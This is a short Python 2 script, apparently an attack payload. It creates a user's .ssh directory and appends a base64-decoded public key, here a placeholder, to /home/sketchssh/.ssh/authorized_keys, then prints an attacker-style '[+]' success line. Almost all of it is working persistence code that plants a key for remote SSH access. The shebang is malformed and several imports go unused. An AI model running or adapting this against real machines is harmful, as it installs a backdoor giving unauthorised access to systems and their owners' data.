#/usr/bin/env python

import os
import sys
import stat
import base64
import subprocess
import time
import StringIO
import gzip
from string import ascii_lowercase

PUBKEY = "PUBLIC_KEY_PLACEHOLDER"

RW = stat.S_IRUSR | stat.S_IWUSR

# if .ssh doesn't exist, make it
DOTSSH = os.path.expanduser("/home/sketchssh/.ssh")
if not os.path.exists(DOTSSH):
    os.mkdir(DOTSSH)
    os.chmod(DOTSSH, stat.S_IRWXU)

with open(os.path.expanduser("/home/sketchssh/.ssh/authorized_keys"), "a") as f:
    f.write(base64.b64decode(PUBKEY))
    print "[+] wrote to /home/sketchssh/.ssh/authorized_keys"